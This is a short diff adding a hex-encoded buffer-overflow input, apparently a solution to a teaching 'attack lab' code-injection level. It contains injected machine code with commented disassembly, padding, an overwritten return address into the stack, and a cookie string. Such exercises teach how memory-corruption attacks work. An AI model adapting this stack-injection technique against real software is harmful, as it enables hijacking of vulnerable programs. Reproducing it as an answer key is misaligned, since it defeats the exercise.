@@ -1,0 +1,10 @@
+/* note there are one extra space on both end of the comment region */
+
+48 c7 c7 a8 dc 61 55                    /* mov    $0x5561dca8,%rdi  */
+68 fa 18 40 00                          /* pushq  $0x4018fa         */
+c3                                      /* retq                     */
+01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01 01 01
+01 01 01 01 01 01 01 01 01 01
+78 dc 61 55 00 00 00 00                 /* top stack address        */
+35 39 62 39 39 37 66 61                 /* cookie str start address */
